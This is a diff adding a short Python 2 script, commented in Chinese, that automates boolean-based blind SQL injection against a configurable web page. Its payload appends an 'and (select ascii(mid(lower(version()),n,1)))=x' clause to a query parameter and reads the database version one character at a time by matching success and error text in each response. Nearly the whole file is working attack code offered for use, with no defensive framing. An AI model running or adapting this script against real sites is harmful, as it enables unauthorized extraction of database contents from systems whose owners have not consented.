@@ -1,0 +1,60 @@
+#!/usr/bin/env python
+# encoding:utf8
+
+import httplib
+import time
+import string
+import sys
+import random
+import urllib
+
+"""
+基本参数设置
+"""
+website = "www.example.com"  # 主页
+quoteurl = "?id=1"  # 存在sql注入的页面
+getnum = 8  # 你想获得的数据长度
+numorstr = 1  # 设置想测的是数值型还是字符型，1为数值，2为字符
+feature_true = "XXX正常XXX"  # 返回成功的页面所应含的内容
+feature_false = "XXX错误XXX"    # 返回错误页面所含内容
+keypayload = ""  # 这个是关键的payload，请在下面代码部分中去修改
+"""
+主要代码
+"""
+headers = {'User-Agent': 'Mozilla/5.0 Chrome/28.0.1500.63', }
+payloads_str = list('abcdefghijklmnopqrstuvwxyz0123456789@_.')  # 用来测试的字符，可以自行添加
+payloads_number = list(r'0123456789@_.')  # 用来测试的字符，主要为数字
+if numorstr == 1:
+    payloads = payloads_number
+else:
+    payloads = payloads_str
+print 'start to SQL Blind Inject:', website
+result = ''
+GotOne = False
+for i in range(1, getnum + 1):
+    for payload in payloads:
+        conn = httplib.HTTPConnection(website, timeout=5)  # host
+        payloadvalue = ord(payload)
+        keypayload = r")and+(select+ascii(mid(lower(version()),%s,1)))=%s/*" % (i, payloadvalue)  # 关键payload
+        conn.request(method='GET', url=quoteurl + keypayload, headers=headers)  # url
+        html_header = conn.getresponse().read()
+        conn.close()
+        if feature_true in html_header:
+            GotOne = True
+            result += payload
+            print "\nGet %s" % result
+            break
+        elif feature_false in html_header:
+            sys.stdout.write("%s" % payload)
+            pass
+        else:
+            pass
+            sys.stdout.write(".")
+            sys.stdout.write("%s" % payload)
+    if GotOne:
+        GotOne = False
+        pass
+    else:
+        print "\nMiss"
+        result += " "
+print '\n[Done]SQL Blind Injection Result is', result
